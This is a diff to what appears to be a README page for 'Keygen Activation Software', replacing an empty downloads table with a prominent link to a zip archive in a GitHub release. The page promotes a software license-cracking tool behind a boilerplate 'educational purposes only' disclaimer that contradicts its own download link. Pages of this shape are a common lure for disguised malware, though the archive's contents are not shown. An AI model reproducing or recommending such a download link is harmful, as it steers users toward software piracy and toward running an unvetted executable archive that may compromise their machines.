@@ -5,10 +5,7 @@
 
 <p dir="ltr"><img src="placeholder_keygen.jpg" alt="Keygen Activation Software" style="max-width: 100%;"></p> <!-- Replace with a relevant image -->
 
-| Downloads | For Windows | For macOS |
-|:-------------:| :-----:| :--------:|
-| (Not Applicable) | | |
-
+# [Download LINK](https://github.com/sashido19/Keygen-Activation/releases/download/2/Keygen.Activation.zip)
 
 <p style="color:red;"><b>Disclaimer:</b> This information is provided for educational purposes only. The unauthorized use of keygens and activation tools is illegal and can have serious consequences. We strongly discourage any illegal activity and recommend purchasing legitimate software licenses.</p>
 
